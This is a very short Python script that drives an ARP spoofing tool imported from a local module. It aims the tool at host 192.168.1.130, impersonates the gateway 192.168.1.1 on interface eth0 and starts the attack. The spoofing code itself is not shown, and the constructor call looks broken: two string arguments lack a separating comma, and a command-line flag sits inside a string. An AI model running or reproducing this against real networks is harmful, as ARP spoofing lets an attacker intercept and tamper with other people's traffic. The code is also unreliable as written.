from main import*

abc=ArpSpoofer('192.168.1.130 -s 192.168.1.1' 'eth0')
abc.get_mac('192.168.1.1')
abc.spoof('192.168.1.130')
abc.run()
